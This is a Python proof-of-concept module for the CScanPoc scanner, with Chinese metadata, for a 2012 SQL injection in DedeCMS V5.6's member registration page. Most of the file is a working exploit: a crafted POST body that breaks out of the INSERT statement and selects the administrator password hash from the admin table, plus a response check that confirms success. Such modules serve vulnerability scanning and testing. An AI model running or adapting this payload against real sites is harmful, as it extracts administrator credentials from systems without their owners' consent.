# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0022'  # 平台漏洞编号，留空
    name = 'DedeCMS V5.6 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-11-30'  # 漏洞公布时间
    desc = '''
        需要magic_quotes_gpc=Off
        应该是没有什么大危害的漏洞.
        原来发过一个Dedecms注射漏洞,貌似并没有修补,重新利用了一下,可以获得管理员密码.
        是一个漏洞.其实不仅仅是审核机制绕过,也可以获得管理员密码的.
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/232/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'DedeCMS 20121122'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e0e05f92-7545-49bf-adab-e8a3fecc311c'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/de/member/reg_new.php'
            data = "dopost=regbase&step=1&mtype=%E4%B8%AA%E4%BA%BA&mtype=%E4%B8%AA%E4%BA%BA&userid=c4rp3nt3r&uname=c4rp3nt3r&userpwd=ssssss&userpwdok=ssssss&email=sss%40ss.ss&safequestion=0&safeanswer=&sex=boy',100,100,'sss@xx.xx',1000,0,'www' and @`'`,(select concat(md5(c),0x3a,pwd) from `#@__admin` limit 1),0,'',1316751900,'',1316751900,'');%00&vdcode=glos&agree="
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
